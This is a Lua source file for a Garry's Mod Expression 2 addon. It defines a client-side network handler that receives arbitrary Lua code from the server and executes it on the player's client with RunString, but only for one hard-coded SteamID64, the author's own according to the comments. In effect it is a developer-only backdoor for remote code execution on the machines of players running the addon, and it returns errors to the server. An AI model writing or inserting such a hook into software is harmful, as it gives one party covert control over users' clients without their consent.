-- Function description for the Expression 2 Helper menu
E2Helper.Descriptions[ "lua" ] = "Execute Lua on the server, or on the specified player. Don't bother trying to use this, only viral32111 can :)"

-- Receive Lua code from the server to execute on the player
net.Receive( "executeLua", function( length )

	-- Read the Lua code from the network message
	local code = net.ReadString()

	-- Read the calling player from the network message
	local caller = net.ReadEntity()

	-- Don't continue if it isn't called by me :)
	if caller:SteamID64() ~= "76561198168833275" then return end

	-- Execute the Lua code and store any errors that occur
	local error = RunString( code, "Expression 2 lua() call", false )

	-- Was there an error?
	if error then

		-- Start the response network message
		net.Start( "respondLua" )

			-- Write the error message to the network message
			net.WriteString( error )

			-- Write the calling player to the network message
			net.WriteEntity( caller )

		-- Send the network message to the server
		net.SendToServer()

	end

end )
